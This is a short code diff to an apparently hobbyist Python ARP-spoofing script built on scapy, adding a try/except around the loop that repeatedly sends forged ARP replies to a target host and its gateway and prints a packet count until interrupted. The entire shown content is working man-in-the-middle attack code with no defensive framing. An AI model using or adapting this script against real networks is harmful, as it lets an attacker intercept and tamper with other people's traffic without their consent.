@@ -22,10 +22,13 @@ def spoof(target_ip, spoof_ip):
     scapy.send(packet, verbose=False)
 
 sent_packets_counts = 0
-while True:
-    spoof(target_ip, gateway_ip)
-    spoof(gateway_ip, target_ip)
-    sent_packets_counts = sent_packets_counts + 2
-    print("\r[+] Packets Sent : {}".format(str(sent_packets_counts))),
-    sys.stdout.flush()
-    time.sleep(2)
+try:
+    while True:
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
+        sent_packets_counts = sent_packets_counts + 2
+        print("\r[+] Packets Sent : {}".format(str(sent_packets_counts))),
+        sys.stdout.flush()
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("[+] Detected Keyboard Interupt.... Quiting")
